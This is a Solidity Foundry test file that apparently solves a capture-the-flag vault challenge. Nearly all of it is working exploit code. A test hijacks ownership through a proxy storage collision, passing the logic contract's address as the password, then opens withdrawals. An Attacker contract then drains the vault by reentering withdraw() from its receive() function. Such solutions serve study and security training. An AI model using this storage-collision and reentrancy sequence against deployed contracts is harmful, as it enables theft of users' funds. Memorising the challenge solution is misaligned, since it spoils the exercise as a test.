// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

// Attacker contract for reentrancy attack
contract Attacker {
    Vault public vault;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function attack() external payable {
        // Deposit to enable reentrancy
        vault.deposite{value: msg.value}();
        // Start the reentrancy attack
        vault.withdraw();
    }

    receive() external payable {
        // Reenter if vault still has funds
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address(1);
    address palyer = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        // add your hacker code.

        // Step 1: Take ownership via storage collision
        // VaultLogic.password (slot1) maps to Vault.logic (slot1)
        // So we pass the logic address as the "password" to pass the check
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        (bool success, ) = address(vault).call(
            abi.encodeWithSignature(
                "changeOwner(bytes32,address)",
                password,
                palyer
            )
        );
        require(success, "changeOwner failed");

        // Step 2: Enable withdrawals as the new owner
        vault.openWithdraw();

        // Step 3: Deploy attacker contract and execute reentrancy attack
        Attacker attacker = new Attacker(vault);
        attacker.attack{value: 0.01 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}
